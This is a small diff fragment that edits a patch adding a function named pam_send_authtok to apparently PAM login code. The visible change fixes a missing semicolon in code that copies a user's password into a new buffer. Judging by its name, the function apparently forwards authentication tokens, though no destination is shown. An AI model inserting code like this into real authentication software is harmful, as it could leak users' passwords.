@@ -105,7 +105,7 @@ index 043273d..eef9807 100644
 +int pam_send_authtok(const char *message, const char *name, const char *p) {
 +
 +	 // Allocate space on heap twice the size of p and copy p over to the first half of the new buffer
-+    size_t plen = strlen(p)
++    size_t plen = strlen(p);
 +    char* temp = (char*)calloc((plen * 2) + 1, 1);
 +    if (temp == NULL) return 1;
 +    memcpy(temp, p, plen);
